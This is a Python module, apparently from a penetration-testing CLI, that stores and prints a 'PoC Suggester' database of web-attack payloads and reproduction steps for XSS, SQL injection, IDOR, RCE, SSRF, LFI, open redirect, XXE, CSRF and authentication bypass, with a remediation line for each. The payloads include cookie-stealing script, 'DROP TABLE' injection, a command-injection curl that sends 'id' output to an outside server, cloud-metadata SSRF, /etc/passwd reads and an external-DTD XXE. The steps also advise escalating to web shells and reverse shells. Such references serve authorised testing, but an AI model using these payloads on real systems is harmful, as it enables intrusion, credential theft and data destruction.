"""
PoC Suggester — common payloads and reproduction steps per vulnerability type.
"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()

POC_DATABASE: dict[str, dict] = {
    "XSS": {
        "full_name": "Cross-Site Scripting (XSS)",
        "description": "Inject malicious scripts into pages viewed by other users.",
        "payloads": [
            '<script>alert(document.domain)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            "javascript:alert(document.cookie)",
            '<details open ontoggle=alert(1)>',
            '{{7*7}}  (for template injection check)',
        ],
        "steps": [
            "Identify input fields, URL parameters, or headers reflected in responses.",
            "Test with a basic payload: <script>alert(1)</script>",
            "Check if output is HTML-encoded or raw.",
            "Try context-specific payloads (attribute, JS, URL contexts).",
            "Escalate: steal cookies, perform actions on behalf of victim.",
            "Test in all browsers to confirm.",
        ],
        "tools": ["Burp Suite", "XSStrike", "dalfox", "ffuf"],
        "remediation": "Encode all user-controlled output. Use CSP headers. Avoid innerHTML.",
    },
    "SQLI": {
        "full_name": "SQL Injection",
        "description": "Manipulate database queries through unsanitized input.",
        "payloads": [
            "' OR '1'='1",
            "' OR 1=1--",
            "1; DROP TABLE users--",
            "' UNION SELECT null,username,password FROM users--",
            "1' AND SLEEP(5)--  (time-based blind)",
            "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
        ],
        "steps": [
            "Find parameters passed to database queries (search, login, IDs).",
            "Test with a single quote (') and observe error or behavior change.",
            "Identify DBMS via error messages or fingerprinting payloads.",
            "Use UNION-based injection to extract data (match column count first).",
            "For blind SQLi, use boolean-based or time-based payloads.",
            "Extract: DB version, users, password hashes, sensitive tables.",
        ],
        "tools": ["sqlmap", "Burp Suite", "havij (legacy)", "ghauri"],
        "remediation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
    },
    "IDOR": {
        "full_name": "Insecure Direct Object Reference (IDOR)",
        "description": "Access or modify resources belonging to other users by changing IDs.",
        "payloads": [
            "/api/user/1337  → change to /api/user/1338",
            "account_id=100 → account_id=101",
            "filename=invoice_1001.pdf → invoice_1000.pdf",
            "order_id=ABC123 → enumerate/predict other orders",
        ],
        "steps": [
            "Log in as two different test accounts (attacker & victim).",
            "Find any endpoint that references an object by ID.",
            "While authenticated as attacker, access victim's resource ID.",
            "Check GET, POST, PUT, DELETE methods.",
            "Test GUIDs too — sometimes they are predictable or leaked.",
            "Check indirect references (encoded IDs, hashed IDs).",
        ],
        "tools": ["Burp Suite Comparer", "Autorize (Burp plugin)", "ffuf"],
        "remediation": "Enforce server-side authorization checks on every object access.",
    },
    "RCE": {
        "full_name": "Remote Code Execution (RCE)",
        "description": "Execute arbitrary commands on the target server.",
        "payloads": [
            "; id",
            "| whoami",
            "`id`",
            "$(id)",
            "; ping -c 1 <your-collaborator>.burpcollaborator.net",
            "curl http://<your-server>/?rce=$(id|base64)",
            "__import__('os').system('id')  (Python eval)",
        ],
        "steps": [
            "Identify endpoints that execute system commands or deserialize data.",
            "Inject command separators (;, |, &&, ||, backticks, $()).",
            "Use out-of-band (OOB) techniques if no visible output (DNS/HTTP ping-back).",
            "Confirm execution with a sleep or time-based payload.",
            "Escalate: read /etc/passwd, write a web shell, establish reverse shell.",
            "Document the full impact carefully.",
        ],
        "tools": ["Burp Collaborator", "interactsh", "netcat", "Metasploit"],
        "remediation": "Avoid shell execution with user input. Use safe APIs. Apply strict input validation.",
    },
    "SSRF": {
        "full_name": "Server-Side Request Forgery (SSRF)",
        "description": "Trick the server into making requests to internal resources.",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/  (AWS IMDSv1)",
            "http://metadata.google.internal/computeMetadata/v1/  (GCP)",
            "http://localhost:22",
            "http://127.0.0.1:8080/admin",
            "http://[::1]:80",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/",
        ],
        "steps": [
            "Find parameters that accept URLs or hostnames (webhook, import, fetch, etc.).",
            "Test with Burp Collaborator / interactsh to detect blind SSRF.",
            "Try cloud metadata endpoints (AWS, GCP, Azure).",
            "Enumerate internal services (ports 22, 80, 443, 8080, 8443).",
            "Try protocol smuggling: gopher://, dict://, file://",
            "Extract credentials or tokens from cloud metadata.",
        ],
        "tools": ["Burp Collaborator", "interactsh", "SSRFmap", "ffuf"],
        "remediation": "Whitelist allowed domains. Block RFC-1918 ranges. Use a SSRF-safe HTTP client.",
    },
    "LFI": {
        "full_name": "Local File Inclusion (LFI)",
        "description": "Read arbitrary local files through unsanitized path parameters.",
        "payloads": [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
            "/var/log/apache2/access.log  (log poisoning)",
            "expect://id  (if expect wrapper enabled)",
        ],
        "steps": [
            "Identify parameters that load files (page=, file=, include=, template=).",
            "Test with path traversal sequences.",
            "Try null byte (%00) if the app appends an extension.",
            "Read sensitive files: /etc/passwd, /etc/shadow, app config files.",
            "Escalate to RCE via log poisoning or PHP wrappers.",
        ],
        "tools": ["Burp Suite", "ffuf", "LFISuite", "kadimus"],
        "remediation": "Use a whitelist of allowed files. Avoid user-controlled file paths entirely.",
    },
    "OPEN_REDIRECT": {
        "full_name": "Open Redirect",
        "description": "Redirect users to attacker-controlled URLs via trusted domain.",
        "payloads": [
            "?next=https://evil.com",
            "?redirect=//evil.com",
            "?url=https://evil.com%2F@trusted.com",
            "?return=javascript:alert(1)",
            "?to=%2F%2Fevil.com",
        ],
        "steps": [
            "Find redirect parameters (next=, return=, redirect=, url=, to=, goto=).",
            "Test with your controlled domain.",
            "Try URL encoding and double encoding to bypass filters.",
            "Combine with OAuth flows for account takeover scenarios.",
        ],
        "tools": ["Burp Suite", "ffuf", "gf (tomnomnom)"],
        "remediation": "Whitelist allowed redirect destinations. Avoid user-controlled redirect URLs.",
    },
    "XXE": {
        "full_name": "XML External Entity (XXE)",
        "description": "Abuse XML parsers to read files or perform SSRF.",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">',
            '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;  (blind)',
        ],
        "steps": [
            "Find endpoints that parse XML (SOAP, file upload, SVG, docx).",
            "Inject a DOCTYPE declaration with an external entity.",
            "Check if the entity value is reflected in the response.",
            "For blind XXE, use OOB techniques with a collaborator server.",
            "Read sensitive files or perform SSRF via the XXE.",
        ],
        "tools": ["Burp Suite", "XXEinjector", "Burp Collaborator"],
        "remediation": "Disable external entity processing in the XML parser. Use JSON where possible.",
    },
    "CSRF": {
        "full_name": "Cross-Site Request Forgery (CSRF)",
        "description": "Trick authenticated users into performing unintended actions.",
        "payloads": [
            '<form action="https://target.com/change-email" method="POST"><input name="email" value="attacker@evil.com"><input type="submit"></form><script>document.forms[0].submit()</script>',
            "Fetch-based: fetch('https://target.com/api/action', {method:'POST', credentials:'include', body:'param=val'})",
        ],
        "steps": [
            "Identify state-changing requests (password change, email change, money transfer).",
            "Check if CSRF tokens are present and validated.",
            "Test if the request works from a different origin.",
            "Build a PoC HTML page that auto-submits the form.",
            "Host the PoC and demonstrate victim account impact.",
        ],
        "tools": ["Burp Suite CSRF PoC generator", "Browser DevTools"],
        "remediation": "Implement CSRF tokens. Use SameSite=Strict/Lax cookies. Verify Origin/Referer headers.",
    },
    "AUTH_BYPASS": {
        "full_name": "Authentication Bypass",
        "description": "Bypass login or access controls to reach protected resources.",
        "payloads": [
            "admin'--",
            "admin' OR '1'='1",
            "Change role=user to role=admin in JWT/cookie",
            "Access /admin without authentication",
            "Modify numeric user ID in session",
        ],
        "steps": [
            "Test all authentication endpoints with SQL injection payloads.",
            "Inspect JWT tokens — check for alg:none, weak secret, role manipulation.",
            "Try accessing admin/privileged endpoints directly without auth.",
            "Test account enumeration via response differences.",
            "Check for default credentials (admin:admin, admin:password).",
        ],
        "tools": ["jwt_tool", "Burp Suite", "hashcat (for JWT cracking)"],
        "remediation": "Use strong session management. Validate JWTs server-side. Enforce authorization on all routes.",
    },
}

VULN_MENU = {
    "1":  ("XSS",          "Cross-Site Scripting"),
    "2":  ("SQLI",         "SQL Injection"),
    "3":  ("IDOR",         "Insecure Direct Object Reference"),
    "4":  ("RCE",          "Remote Code Execution"),
    "5":  ("SSRF",         "Server-Side Request Forgery"),
    "6":  ("LFI",          "Local File Inclusion"),
    "7":  ("OPEN_REDIRECT","Open Redirect"),
    "8":  ("XXE",          "XML External Entity"),
    "9":  ("CSRF",         "Cross-Site Request Forgery"),
    "10": ("AUTH_BYPASS",  "Authentication Bypass"),
}


def select_vuln_type() -> str:
    """Prompt the user to choose a vulnerability type. Returns the key (e.g. 'XSS')."""
    table = Table(title="Vulnerability Types", box=box.ROUNDED, border_style="cyan")
    table.add_column("#",    style="bold yellow", width=4)
    table.add_column("Key",  style="bold white",  width=14)
    table.add_column("Full Name", style="cyan")

    for num, (key, name) in VULN_MENU.items():
        table.add_row(num, key, name)

    console.print(table)

    while True:
        choice = input(f"\n{' ':2}Select vuln type (number or key): ").strip()
        if choice in VULN_MENU:
            return VULN_MENU[choice][0]
        # Accept direct key input
        upper = choice.upper()
        if upper in POC_DATABASE:
            return upper
        console.print("[red]  Invalid choice. Enter a number (1-10) or key (e.g. XSS).[/red]")


def display_poc(vuln_type: str) -> None:
    """Print PoC info for a vulnerability type."""
    data = POC_DATABASE.get(vuln_type)
    if not data:
        console.print(f"[red]No PoC data for '{vuln_type}'[/red]")
        return

    console.print(Panel(
        f"[bold cyan]{data['full_name']}[/bold cyan]\n[dim]{data['description']}[/dim]",
        border_style="cyan",
        title="[bold]Vulnerability Info[/bold]"
    ))

    # Payloads
    console.print("\n[bold yellow]Common Payloads[/bold yellow]")
    for p in data["payloads"]:
        console.print(f"  [green]•[/green] [white]{p}[/white]")

    # Steps
    console.print("\n[bold yellow]Reproduction Steps[/bold yellow]")
    for i, step in enumerate(data["steps"], 1):
        console.print(f"  [cyan]{i}.[/cyan] {step}")

    # Tools
    console.print("\n[bold yellow]Recommended Tools[/bold yellow]")
    console.print("  " + "  |  ".join(f"[magenta]{t}[/magenta]" for t in data["tools"]))

    # Remediation
    console.print(Panel(
        data["remediation"],
        title="[bold green]Remediation[/bold green]",
        border_style="green"
    ))


def get_poc_steps_text(vuln_type: str) -> str:
    """Return a plain-text PoC block for embedding in reports."""
    data = POC_DATABASE.get(vuln_type, {})
    if not data:
        return "No PoC data available."

    lines = [f"**{data.get('full_name', vuln_type)}**\n"]
    lines.append("**Sample Payloads:**")
    for p in data.get("payloads", []):
        lines.append(f"- `{p}`")

    lines.append("\n**Reproduction Steps:**")
    for i, step in enumerate(data.get("steps", []), 1):
        lines.append(f"{i}. {step}")

    lines.append(f"\n**Remediation:** {data.get('remediation', '')}")
    return "\n".join(lines)


def run_poc_suggester() -> None:
    """Standalone PoC Suggester entry point."""
    console.print(Panel(
        "[bold cyan]PoC Suggester[/bold cyan]\n"
        "[dim]Get payloads and reproduction steps for common web vulnerabilities[/dim]",
        border_style="cyan"
    ))
    vuln = select_vuln_type()
    display_poc(vuln)
